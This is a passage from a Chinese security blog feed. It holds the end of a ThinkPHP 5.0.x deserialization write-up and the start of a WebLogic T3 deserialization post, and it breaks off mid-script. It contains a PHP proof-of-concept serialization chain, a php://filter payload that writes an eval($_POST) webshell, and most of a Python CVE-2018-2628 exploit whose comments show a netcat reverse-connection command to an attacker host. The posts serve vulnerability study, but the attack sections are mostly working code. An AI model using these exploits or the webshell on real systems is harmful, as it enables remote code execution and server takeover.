src="https://z3.ax1x.com/2021/08/05/feFXPs.png" alt="feFXPs.png"></a></p><p>第三个条件，需要让$modelRelation-&gt;getModel()返回Output类</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">get<span class="hljs-constructor">_class($<span class="hljs-params">modelRelation</span>-&gt;<span class="hljs-params">getModel</span>()</span>)<span class="hljs-operator"> == </span>get<span class="hljs-constructor">_class($<span class="hljs-params">this</span>-&gt;<span class="hljs-params">parent</span>)</span><br></code></pre></td></tr></table></figure><p>/thinkphp/library/think/model/Relation.php</p><p>Relation的getModel方法可以调用任意类的getModel方法，全局搜索getModel()</p><p><a href="https://imgtu.com/i/feFjGn"><img src="https://z3.ax1x.com/2021/08/05/feFjGn.png" alt="feFjGn.png"></a></p><p>/thinkphp/library/think/db/Query.php</p><p>Query类的getModel方法直接返回$this-&gt;model，让model属性等于output就可以了</p><p><a href="https://imgtu.com/i/feFv2q"><img src="https://z3.ax1x.com/2021/08/05/feFv2q.png" alt="feFv2q.png"></a></p><p><strong>$attr的来源</strong></p><p>$modelRelation必须是一个有getBindAttr方法且bindAttr属性可控的类，全局搜索存在getBindAttr方法的类</p><p><a href="https://imgtu.com/i/feFqaQ"><img src="https://z3.ax1x.com/2021/08/05/feFqaQ.png" alt="feFqaQ.png"></a></p><p>/thinkphp/library/think/model/relation/OneToOne.php</p><p>找到符合要求的类OneToOne，上面已经用了它的子类HasOne，所以直接改HasOne的bindAttr属性就行</p><p><a href="https://imgtu.com/i/feFL5j"><img src="https://z3.ax1x.com/2021/08/05/feFL5j.png" alt="feFL5j.png"></a></p><p>先构造部分poc，目的是成功调用到Output类的__call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//__destruct</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Windows</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">files</span>=[];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$pivot</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files[]=<span class="hljs-variable">$pivot</span>; <span class="hljs-comment">//传入Pivot类</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//__toString Pivot是Model子类</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Pivot</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">parent</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span>,<span class="hljs-variable">$hasone</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;parent=<span class="hljs-variable">$output</span>; <span class="hljs-comment">//$this-&gt;parent等于Output类</span><br>            <span class="hljs-keyword">$this</span>-&gt;append=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;getError&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;error=<span class="hljs-variable">$hasone</span>;   <span class="hljs-comment">//$modelRelation=$this-&gt;error=Hasone类</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//getModel</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Query</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">model</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;model=<span class="hljs-variable">$output</span>; <span class="hljs-comment">//$modelRelation-&gt;getModel()等于Output类</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//__call</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Output</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br>//<span class="hljs-title">HasOne</span>类继承自<span class="hljs-title">Relation</span><br><span class="hljs-title">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">HasOne</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">query</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$query</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;query=<span class="hljs-variable">$query</span>; <span class="hljs-comment">//调用Query类的getModel</span><br><br>            <span class="hljs-keyword">$this</span>-&gt;selfRelation=<span class="hljs-literal">false</span>; <span class="hljs-comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span><br>            <span class="hljs-keyword">$this</span>-&gt;bindAttr=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>];  <span class="hljs-comment">//控制__call的参数$attr</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title">output</span>=<span class="hljs-title">new</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>();<br><br>    <span class="hljs-variable">$query</span>=<span class="hljs-keyword">new</span> think\db\Query(<span class="hljs-variable">$output</span>);<br><br>    <span class="hljs-variable">$hasone</span>=<span class="hljs-keyword">new</span> think\model\relation\HasOne(<span class="hljs-variable">$query</span>);<br>    <span class="hljs-variable">$pivot</span>=<span class="hljs-keyword">new</span> think\model\Pivot(<span class="hljs-variable">$output</span>,<span class="hljs-variable">$hasone</span>);<br>    <span class="hljs-variable">$windows</span>=<span class="hljs-keyword">new</span> think\process\pipes\Windows(<span class="hljs-variable">$pivot</span>);<br><br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$windows</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>成功调用了Output类的__call</p><p><a href="https://imgtu.com/i/fekSMV"><img src="https://z3.ax1x.com/2021/08/05/fekSMV.png" alt="fekSMV.png"></a></p><p>4./thinkphp/library/think/console/Output.php</p><p>Output类的__call，调用block方法</p><p><a href="https://imgtu.com/i/feFyDO"><img src="https://z3.ax1x.com/2021/08/05/feFyDO.png" alt="feFyDO.png"></a></p><p>5./thinkphp/library/think/console/Output.php</p><p>Output类的block方法调用了writeIn，$message就是HasOne类的属性bindAttr数组的值，是可控的。格式如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">getAttr</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">getAttr</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/feFsKK"><img src="https://z3.ax1x.com/2021/08/05/feFsKK.png" alt="feFsKK.png"></a></p><p><a href="https://imgtu.com/i/feFxx0"><img src="https://z3.ax1x.com/2021/08/05/feFxx0.png" alt="feFxx0.png"></a></p><p>6./thinkphp/library/think/console/Output.php</p><p>Output类的writeIn方法调用了write方法，$this-&gt;handle可控，可以调用任意类的write方法。全局搜索write方法</p><p><a href="https://imgtu.com/i/fek9qU"><img src="https://z3.ax1x.com/2021/08/05/fek9qU.png" alt="fek9qU.png"></a></p><p>7.thinkphp/library/think/session/driver/Memcached.php</p><p>找到Memcached类的write方法，可以调用任意类的set方法，全局搜索set方法</p><p><a href="https://imgtu.com/i/fekprT"><img src="https://z3.ax1x.com/2021/08/05/fekprT.png" alt="fekprT.png"></a></p><p>8.thinkphp/library/think/cache/driver/File.php</p><p>最后找到File类，set方法中可以调用file_put_contents方法写入shell。</p><p>第一个参数$name是从block方法那里传入的，还是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">getAttr</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">getAttr</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第二个参数$value固定为false</p><p><a href="https://imgtu.com/i/feFgVe"><img src="https://z3.ax1x.com/2021/08/05/feFgVe.png" alt="feFgVe.png"></a></p><p>文件名$filename来源于getCacheKey，实际上等于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;path&#x27;</span>] . md5(<span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;path&#x27;</span>] . md5(<span class="hljs-string">&#x27;&lt;getAttr&gt;admin&lt;/getAttr&gt;&#x27;</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可以通过$this-&gt;options[‘path’]控制文件名</p><p><a href="https://imgtu.com/i/feF6bD"><img src="https://z3.ax1x.com/2021/08/05/feF6bD.png" alt="feF6bD.png"></a></p><p>还有个问题，文件内容不可控。</p><p>$data来自于set方法的参数$value，而$value的值固定为true，而且$expire只能为数值，</p><p><a href="https://imgtu.com/i/feF2UH"><img src="https://z3.ax1x.com/2021/08/05/feF2UH.png" alt="feF2UH.png"></a></p><p>9.thinkphp/library/think/cache/driver/File.php</p><p>继续执行进入setTagItem，再次调用set，两个参数都可控了</p><p><a href="https://imgtu.com/i/feFR5d"><img src="https://z3.ax1x.com/2021/08/05/feFR5d.png" alt="feFR5d.png"></a></p><p>现在第一个参数$name等于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;tag_&#x27;</span> . md5(<span class="hljs-keyword">$this</span>-&gt;tag);<br></code></pre></td></tr></table></figure><p>$value就是上面的$filename</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$value</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.utf-8.utf-7|convert.base64-decode/</span>resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g<span class="hljs-regexp">/../</span>a.php63ac11a7699c5c57d85009296440d77a.php<br></code></pre></td></tr></table></figure><p>利用php://filter的convert.iconv和convret.base64-decode绕过拼接的exit()，写入webshell</p><p>原理见：<a href="https://xz.aliyun.com/t/7457">https://xz.aliyun.com/t/7457</a></p><p><a href="https://imgtu.com/i/fekPZF"><img src="https://z3.ax1x.com/2021/08/05/fekPZF.png" alt="fekPZF.png"></a></p><p>一共会写入两个文件，第一个文件内容不可控，第二个才是webshell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>.php<span class="hljs-number">3</span>b<span class="hljs-number">58</span>a<span class="hljs-number">9545013</span>e<span class="hljs-number">88</span>c<span class="hljs-number">7186</span>db<span class="hljs-number">11</span>bb<span class="hljs-number">158</span>c<span class="hljs-number">44</span>.php<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实际测试在5.0.24和5.0.18可用，5.0.9不可用</p><p>要点：</p><ol><li>Model类的<code>__toString</code>调用Output类的<code>__call</code>的条件</li><li>二次调用set实现内容可控</li><li>用过滤器绕过文件名和exit()</li></ol><p>借用文章里的图总结一下</p><p><a href="https://imgtu.com/i/fekAi9"><img src="https://z3.ax1x.com/2021/08/05/fekAi9.png" alt="fekAi9.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7457">https://xz.aliyun.com/t/7457</a></p><p><a href="https://www.anquanke.com/post/id/196364">https://www.anquanke.com/post/id/196364</a></p><p><a href="https://xz.aliyun.com/t/7082">https://xz.aliyun.com/t/7082</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic：T3反序列化历史漏洞学习（二）</title>
    <link href="/2021/07/29/Weblogic%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/07/29/Weblogic%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：</p><ul><li>WebLogic 10.3.6.0</li><li>WebLogic 12.1.3.0</li><li>WebLogic 12.2.1.0</li><li>WebLogic 12.2.1.1</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># IMPORTANT: Is provided only for educational or information purposes.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Credit: Thanks by Liao Xinxi of NSFOCUS Security Team</span><br><span class="hljs-comment"># Reference: http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># How to exploit:</span><br><span class="hljs-comment"># 1. run below command on JRMPListener host</span><br><span class="hljs-comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br><span class="hljs-comment">#    2) java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br><span class="hljs-comment">#       e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;nc -nv 10.0.0.5 4040&#x27;</span><br><span class="hljs-comment"># 2. start a listener on attacker host</span><br><span class="hljs-comment">#    e.g. nc -nlvp 4040</span><br><span class="hljs-comment"># 3. run this script on attacker host</span><br><span class="hljs-comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br><span class="hljs-comment">#    2) python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br><span class="hljs-comment">#       e.g.</span><br><span class="hljs-comment">#           a) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient (Using java.rmi.registry.Registry)</span><br><span class="hljs-comment">#           b) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient2 (Using java.rmi.activation.Activator)</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_payload</span>(<span class="hljs-params">path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br>    <span class="hljs-comment">#generates ysoserial payload</span><br>    command = <span class="hljs-string">&#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;</span>.<span class="hljs-built_in">format</span>(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)<br>    print(<span class="hljs-string">&quot;command: &quot;</span> + command)<br>    os.system(command)<br>    bin_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.out&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    <span class="hljs-keyword">return</span> binascii.hexlify(bin_file)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">t3_handshake</span>(<span class="hljs-params">sock, server_addr</span>):</span><br>    sock.connect(server_addr)<br>    sock.send(<span class="hljs-string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    time.sleep(<span class="hljs-number">1</span>)<br>    sock.recv(<span class="hljs-number">1024</span>)<br>    print(<span class="hljs-string">&#x27;handshake successful&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_t3_request_object</span>(<span class="hljs-params">sock, port</span>):</span><br>    data1 = <span class="hljs-string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(dport))<br>    data3 = <span class="hljs-string">&#x27;1a7727000d3234322e323134&#x27;</span><br>    data4 = <span class="hljs-string">&#x27;2e312e32353461863d1d0000000078&#x27;</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> [data1,data2,data3,data4]:<br>        sock.send(d.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    time.sleep(<span class="hljs-number">2</span>)<br>    print(<span class="hljs-string">&#x27;send request payload successful,recv length:%d&#x27;</span>%(<span class="hljs-built_in">len</span>(sock.recv(<span class="hljs-number">2048</span>))))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_payload_objdata</span>(<span class="hljs-params">sock, data</span>):</span><br>    payload=<span class="hljs-string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span><br>    payload+=data<br>    payload+=<span class="hljs-string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span><br>    payload = <span class="hljs-string">&#x27;%s%s&#x27;</span>%(<span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(payload)/<span class="hljs-number">2</span> + <span class="hljs-number">4</span>),payload)<br>    sock.send(payload.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    time.sleep(<span class="hljs-number">2</span>)<br>    sock.send(payload.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            res += sock.recv(<span class="hljs-number">4096</span>)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span>(<span class="hljs-params">dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(<span class="hljs-number">65</span>)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, 